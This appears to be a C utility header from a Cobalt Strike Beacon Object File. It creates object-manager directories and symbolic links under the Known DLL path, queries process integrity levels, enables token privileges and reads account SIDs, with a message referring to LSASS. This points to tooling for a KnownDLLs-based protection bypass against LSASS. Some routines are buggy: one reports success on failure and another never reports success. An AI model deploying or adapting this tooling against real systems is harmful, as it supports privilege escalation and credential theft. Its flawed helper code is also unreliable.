#pragma once

#include <windows.h>
#include "syscalls.h"
#include "ntdll.h"
#include "api_functions.h"
#include "tdefs.h"
#include "beacon.h"
#include <sddl.h>
#include <securitybaseapi.h>
#include <rpcdce.h>

typedef PVOID HANDLE;

///////////////////////////////
// Extern "global" variables //
///////////////////////////////
extern DWORD pid;
extern WCHAR wcPID[];
extern BOOL  forceDosDeviceCreation;
extern BOOL  gVerbose;
extern BOOL  gDebug;
extern FUNCTION_POINTER_STRUCT sFunctionPointerStruct;
extern HMODULE hmKernel32ModuleHandle;
extern HMODULE hmAdvapi32ModuleHandle;

HANDLE ObjectManagerCreateDirectory(PCWSTR dirname);
HANDLE ObjectManagerCreateSymlink(LPCWSTR linkname, LPCWSTR targetname);
BOOL ProcessGetIntegrityLevel(DWORD dwProcessId, PDWORD pdwIntegerityLevel);
BOOL TokenGetSid(HANDLE hToken, PSID* ppSid);
BOOL TokenGetSidAsString(HANDLE hToken, LPWSTR* ppwszStringSid);
BOOL TokenCompareSids(PSID pSidA, PSID pSidB);
BOOL TokenCheckPrivilege(HANDLE hToken, LPCWSTR pwszPrivilege, BOOL bEnablePrivilege);
BOOL TokenGetUsername(HANDLE hToken, LPWSTR* ppwszUsername);
BOOL TokenIsNotRestricted(HANDLE hToken, PBOOL pbIsNotRestricted);
BOOL MiscGenerateGuidString(LPWSTR* ppwzGuid);


HANDLE ObjectManagerCreateDirectory(PCWSTR dirname) {
    OBJECT_ATTRIBUTES oa = { 0 };
    UNICODE_STRING name = { 0 };
    HANDLE hDirectory = NULL;
    NTSTATUS status = 0;

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)(sFunctionPointerStruct.StructGetProcAddress(sFunctionPointerStruct.StructGetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString"));
    BeaconPrintf(CALLBACK_OUTPUT, "Found Pointer for RtlInitUnicodeString: %p\n", RtlInitUnicodeString);

    RtlInitUnicodeString(&name, dirname);

    BeaconPrintf(CALLBACK_OUTPUT, "Known DLL Path: %ls\n", (wchar_t*)dirname);

    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);


    status = NtCreateDirectoryObjectEx(&hDirectory, (DWORD)DIRECTORY_ALL_ACCESS, &oa, 0, 0);
    if (status == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "We successfully created an NtCreateDirectoryObject object.\n");
        return hDirectory;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "We did not successfully create an object: 0x%llx\n", status);
        return NULL;
    }

}


HANDLE ObjectManagerCreateSymlink(LPCWSTR linkname, LPCWSTR targetname) {
    OBJECT_ATTRIBUTES oa = { 0 };
    UNICODE_STRING name = { 0 };
    UNICODE_STRING target = { 0 };
    HANDLE hLink = NULL;
    NTSTATUS status = 0;

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)(sFunctionPointerStruct.StructGetProcAddress(sFunctionPointerStruct.StructGetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString"));
    RtlInitUnicodeString(&name, linkname);
    RtlInitUnicodeString(&target, targetname);
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &oa, &target);

    if (status == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "We successfully created an NtCreateSymbolicLinkObject via ObjectManagerCreateSymlink (utils.h).\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "We did not successfully create an NtCreateSymbolicLinkObject via ObjectManagerCreateSymlink (utils.h).\n");
        return NULL;
    }

    return hLink;
}


BOOL ProcessGetIntegrityLevel(DWORD dwProcessId, PDWORD pdwIntegerityLevel) {
    BOOL returnValue = FALSE;

    HANDLE hProcess = NULL;
    HANDLE hProcessToken = NULL;
    PTOKEN_MANDATORY_LABEL pLabel = NULL;
    DWORD dwLength = 0;
    DWORD dwIntegrityLevel = 0;

    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    CLIENT_ID cid = { 0 };
    cid.UniqueProcess = dwProcessId;

    NTSTATUS newb;

    newb = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, &oa, &cid);
    if (!NT_SUCCESS(newb)) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to get process handle for current PID. Exiting.\n");
        goto cleanup;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully retrieved limited information handle for current PID. :)\n");
    }

    if (!NT_SUCCESS(NtOpenProcessToken(hProcess, TOKEN_QUERY, &hProcessToken))) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to get process token for LSASS PID. Exiting.\n");
        goto cleanup;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully retrieved token for current PID. :)\n");
    }

    // Called twice to get what we need.
    // The first call should populate our LastError, as we're modifying a struct field in memory.
    sFunctionPointerStruct.StructGetTokenInformation(hProcessToken, TokenIntegrityLevel, pLabel, dwLength, &dwLength);
    if (sFunctionPointerStruct.StructGetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        BeaconPrintf(CALLBACK_ERROR, "Error getting token information: %lu. Exiting.\n", sFunctionPointerStruct.StructGetLastError());
        goto cleanup;
    }

    pLabel = (PTOKEN_MANDATORY_LABEL)sFunctionPointerStruct.StructLocalAlloc(LPTR, dwLength);
    if (!pLabel) {
        BeaconPrintf(CALLBACK_ERROR, "Error in acquiring pLabel in ProcessIntegrityGetLevel. Exiting.\n");
        goto cleanup;
    }

    if (!sFunctionPointerStruct.StructGetTokenInformation(hProcessToken, TokenIntegrityLevel, pLabel, dwLength, &dwLength)) {
        BeaconPrintf(CALLBACK_ERROR, "Error in acquiring token information. Exiting\n");
        goto cleanup;
    }

    dwIntegrityLevel = *sFunctionPointerStruct.StructGetSidSubAuthority(pLabel->Label.Sid, *sFunctionPointerStruct.StructGetSidSubAuthorityCount(pLabel->Label.Sid) - 1);
    if (dwIntegrityLevel == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Exiting early.\n");
        goto cleanup;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Current integrity level: 0x%08x\n", dwIntegrityLevel);
    }

    *pdwIntegerityLevel = dwIntegrityLevel;
    returnValue = TRUE;

    cleanup:
        if (pLabel) {
            sFunctionPointerStruct.StructLocalFree(pLabel);
        }
        if (hProcessToken) {
            NtClose(hProcessToken);
        }
        if (hProcess) {
            NtClose(hProcess);
        }

        return returnValue;
}


BOOL TokenGetSid(HANDLE hToken, PSID* ppSid) {
    BOOL bReturnValue = TRUE;
    DWORD dwSize = 0;
    PTOKEN_USER pTokenUser = NULL;

    if ( !sFunctionPointerStruct.StructGetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize) ) {
        if ( sFunctionPointerStruct.StructGetLastError() != ERROR_INSUFFICIENT_BUFFER ) {
            BeaconPrintf(CALLBACK_ERROR, "We received an unexpected value from TokenGetSid's GetTokenInformation in utils.h.\n");
            goto end;
        }
    }

    // Second call to populate
    pTokenUser = (PTOKEN_USER)sFunctionPointerStruct.StructLocalAlloc(LPTR, dwSize);
    if (!pTokenUser) {
        goto end;
    }

    if ( !sFunctionPointerStruct.StructGetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize) ) {
        BeaconPrintf(CALLBACK_ERROR, "We received an unexpected value from TokenGetSid's GetTokenInformation in utils.h.\n");
        goto end;
    }

    *ppSid = (PSID)sFunctionPointerStruct.StructLocalAlloc(LPTR, SECURITY_MAX_SID_SIZE);
    if (!*ppSid) {
        BeaconPrintf(CALLBACK_ERROR, "Error in setting dereferenced value in utils.h TokenGetSid ppsid.\n");
        goto end;
    }

    if ( !sFunctionPointerStruct.StructCopySid(SECURITY_MAX_SID_SIZE, *ppSid, pTokenUser->User.Sid) ) {
        BeaconPrintf(CALLBACK_ERROR, "Error in setting copying SID in utils.h TokenGetSid ppsid.\n");
        goto end;
    }

    bReturnValue = TRUE;

    end:
        if (pTokenUser) {
            sFunctionPointerStruct.StructLocalFree(pTokenUser);
        }

        return bReturnValue;
}


BOOL TokenGetSidAsString(HANDLE hToken, LPWSTR* ppwszStringSid) {
    BOOL bReturnValue = FALSE;
    PSID pSid         = NULL;

    if ( TokenGetSid(hToken, &pSid) ) {
        if ( sFunctionPointerStruct.StructConvertSidToStringSidW(pSid, ppwszStringSid) ) {
            bReturnValue = TRUE;
        }
        sFunctionPointerStruct.StructLocalFree(pSid);
    }

    return bReturnValue;
}


BOOL TokenCompareSids(PSID pSidA, PSID pSidB) {
    BOOL bReturnValue = FALSE;
    LPWSTR pwszSidA   = NULL;
    LPWSTR pwszSidB   = NULL;

    if ( sFunctionPointerStruct.StructConvertSidToStringSidW(pSidA, &pwszSidA) && sFunctionPointerStruct.StructConvertSidToStringSidW(pSidB, &pwszSidB) ) {
        bReturnValue = MSVCRT$_wcsicmp(pwszSidA, pwszSidB) == 0;
        sFunctionPointerStruct.StructLocalFree(pwszSidA);
        sFunctionPointerStruct.StructLocalFree(pwszSidB);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "We have encountered an error in TokenCompareSids within utils.h: 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
    }

    return bReturnValue;
}


BOOL TokenCheckPrivilege(HANDLE hToken, LPCWSTR pwszPrivilege, BOOL bEnablePrivilege) {
    BOOL bReturnValue = FALSE;
    DWORD dwTokenPrivilegesSize = 0;
    DWORD dwPrivilegeNameLength = 0;
    PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
    LUID_AND_ATTRIBUTES laa = { 0 };
    TOKEN_PRIVILEGES tp = { 0 };
    LPWSTR pwszPrivilegeNameTemp = NULL;

    if ( !sFunctionPointerStruct.StructGetTokenInformation(hToken, TokenPrivileges, NULL, dwTokenPrivilegesSize, &dwTokenPrivilegesSize) ) {
        if ( sFunctionPointerStruct.StructGetLastError() != ERROR_INSUFFICIENT_BUFFER ) {
            BeaconPrintf(CALLBACK_ERROR, "An error was encountered in GetTokenInformation of TokenCheckPrivilege (utils.h) 1: 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
            goto end;
        }
    }

    pTokenPrivileges = (PTOKEN_PRIVILEGES)sFunctionPointerStruct.StructLocalAlloc(LPTR, dwTokenPrivilegesSize);
    if ( !pTokenPrivileges ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create local heap allocation in TokenCheckPrivilege (utils.h) 2:\n");
        goto end;
    }

    if ( !sFunctionPointerStruct.StructGetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenPrivilegesSize, &dwTokenPrivilegesSize) ) {
        BeaconPrintf(CALLBACK_ERROR, "An error was encountered in GetTokenInformation of TokenCheckPrivilege (utils.h) 3: 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
        goto end;
    }

    for (int i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
        laa = pTokenPrivileges->Privileges[i];
        dwPrivilegeNameLength = 0;

        if ( !sFunctionPointerStruct.StructLookupPrivilegeNameW(NULL, &(laa.Luid), NULL, &dwPrivilegeNameLength) ) {
            if ( sFunctionPointerStruct.StructGetLastError() != ERROR_INSUFFICIENT_BUFFER ) {
                BeaconPrintf(CALLBACK_ERROR, "An error was encountered in LookupPrivilegeNameW of TokenCheckPrivilege (utils.h) 4: 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
                goto end;
            }
        }

        dwPrivilegeNameLength++;

        if ( pwszPrivilegeNameTemp = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, dwPrivilegeNameLength * sizeof(WCHAR)) ) {
            if ( sFunctionPointerStruct.StructLookupPrivilegeNameW(NULL, &(laa.Luid), pwszPrivilegeNameTemp, &dwPrivilegeNameLength) ) {
				if ( !MSVCRT$_wcsicmp(pwszPrivilegeNameTemp, pwszPrivilege) ) {
                    if ( bEnablePrivilege ) {
                        MSVCRT$memset(&tp, 0, sizeof(TOKEN_PRIVILEGES));
                        tp.PrivilegeCount = 1;
                        tp.Privileges[0].Luid = laa.Luid;
                        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                        if ( sFunctionPointerStruct.StructAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL) ) {
                            BeaconPrintf(CALLBACK_OUTPUT, "Successfully adjusted token privileges in TokenCheckPrivilege (utils.h)\n");
                            bReturnValue = TRUE;
                        } else {
                            BeaconPrintf(CALLBACK_ERROR, "Failed to adjust token privileges in TokenCheckPrivilege (utils.h)\n");
                        }
                    } else {
                        bReturnValue = TRUE;
                    }

                    break;
                }
            } else {
                BeaconPrintf(CALLBACK_ERROR, "An error was encountered in GetTokenInformation of TokenCheckPrivilege (utils.h): 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
                BeaconPrintf(CALLBACK_ERROR, "TokenCheckPrivilege: 7\n");
            }

            sFunctionPointerStruct.StructLocalFree(pwszPrivilegeNameTemp);
        }
    }

    end:
        if (pTokenPrivileges) {
            sFunctionPointerStruct.StructLocalFree(pTokenPrivileges);
        }

        return bReturnValue;
}


BOOL TokenGetUsername(HANDLE hToken, LPWSTR* ppwszUsername) {
    BOOL bReturnValue = FALSE;
    PSID pSid = NULL;
    const DWORD dwMaxSize = 256;
    WCHAR wszUsername[256] = { 0 };
    WCHAR wszFieldSeparator[6] = L"\\";
    WCHAR wszDomain[256] = { 0 };
    DWORD dwMaxUsername = 256;
    DWORD dwMaxDomain = 256;
    SID_NAME_USE type;

    if (!TokenGetSid(hToken, &pSid)) {
        BeaconPrintf(CALLBACK_ERROR, "Encountered error in call to TokenGetSid in TokenGetUsername (utils.h): 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
        goto end;
    }

    if ( !sFunctionPointerStruct.StructLookupAccountSidW(NULL, pSid, wszUsername, &dwMaxUsername, wszDomain, &dwMaxDomain, &type) ) {
        BeaconPrintf(CALLBACK_ERROR, "Encountered error in call to LookupAccountSidW in TokenGetUsername (utils.h): 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
        goto end;
    }

    *ppwszUsername = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, (dwMaxSize * 2 + 8) * sizeof(WCHAR));

    if (!*ppwszUsername) {
        goto end;
    }

    MSVCRT$wcsncpy(*ppwszUsername, wszDomain, sFunctionPointerStruct.StructlstrlenW(wszDomain));
    MSVCRT$wcsncat(*ppwszUsername, wszFieldSeparator, sFunctionPointerStruct.StructlstrlenW(wszFieldSeparator));
    MSVCRT$wcsncat(*ppwszUsername, wszUsername, sFunctionPointerStruct.StructlstrlenW(wszUsername));

    BeaconPrintf(CALLBACK_OUTPUT, "Successful local heap allocation within TokenGetUsername (utils.h): %ls\n", (wchar_t*)(*ppwszUsername));

    bReturnValue = TRUE;

    end:
        if (pSid) {
            sFunctionPointerStruct.StructLocalFree(pSid);
        }

        return bReturnValue;
}


BOOL TokenIsNotRestricted(HANDLE hToken, PBOOL pbIsNotRestricted) {
    BOOL bReturnValue = FALSE;
    DWORD dwSize = 0;
    PTOKEN_GROUPS pTokenGroups = NULL;

    if ( !sFunctionPointerStruct.StructGetTokenInformation(hToken, TokenRestrictedSids, NULL, dwSize, &dwSize) ) {
        if ( sFunctionPointerStruct.StructGetLastError() != ERROR_INSUFFICIENT_BUFFER ) {
            BeaconPrintf(CALLBACK_ERROR, "Error in TokenIsNotRestricted (utils.h): 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
            goto end;
        }
    }

    pTokenGroups = (PTOKEN_GROUPS)sFunctionPointerStruct.StructLocalAlloc(LPTR, dwSize);
    if (!pTokenGroups) {
        goto end;
    }

    if ( !sFunctionPointerStruct.StructGetTokenInformation(hToken, TokenRestrictedSids, pTokenGroups, dwSize, &dwSize) ) {
        BeaconPrintf(CALLBACK_ERROR, "Error in TokenIsNotRestricted (utils.h): 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
        goto end;
    }

    *pbIsNotRestricted = pTokenGroups->GroupCount == 0;

    bReturnValue = TRUE;

    end:
        if (pTokenGroups) {
            sFunctionPointerStruct.StructLocalFree(pTokenGroups);
        }

        return bReturnValue;
}


BOOL MiscGenerateGuidString(LPWSTR* ppwzGuid) {
    BOOL bReturnValue = FALSE;

    UUID uuid = { 0 };
    RPC_WSTR wstrGuid = NULL;

    if ( RPCRT4$UuidCreate(&uuid) != RPC_S_OK ) {
        BeaconPrintf(CALLBACK_ERROR, "Error in creating GUID string. Exiting.\n");
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Guid string generated.\n");
    }

    if ( RPCRT4$UuidToStringW(&uuid, &wstrGuid) != RPC_S_OK ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed call to UuidToString. Exiting.\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Converted UUID to string.\n");
    }
    
    *ppwzGuid = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, (MSVCRT$wcslen((LPWSTR)wstrGuid) + 1) * sizeof(WCHAR));
    if ( !*ppwzGuid ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed allocation for ppwzGuid in MiscGenerateGuidString. Exiting.\n");
        goto end;
    }

    MSVCRT$wcsncpy(*ppwzGuid, (LPWSTR)wstrGuid, MSVCRT$wcslen((LPWSTR)wstrGuid));
    
    BeaconPrintf(CALLBACK_OUTPUT, "Generated GUID: %ls.\n", (wchar_t*)(*ppwzGuid));

    end:
        if (wstrGuid) {
            RPCRT4$RpcStringFreeW(&wstrGuid);
        }

        return bReturnValue;
}